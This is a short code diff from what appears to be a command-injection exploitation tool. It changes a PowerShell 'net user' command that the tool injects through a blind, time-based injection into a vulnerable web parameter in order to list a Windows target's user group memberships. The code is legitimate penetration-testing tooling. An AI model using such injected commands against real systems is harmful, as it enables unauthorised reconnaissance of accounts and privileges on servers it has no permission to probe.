@@ -169,7 +169,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
           count = count + 1
           if menu.options.privileges:
             print "(*) Confirming privileges of user '" + sys_users_list[user] + "'... "
-            cmd = "powershell.exe write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
+            cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
             if alter_shell:
               cmd = cmd.replace("'","\\'")
             check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
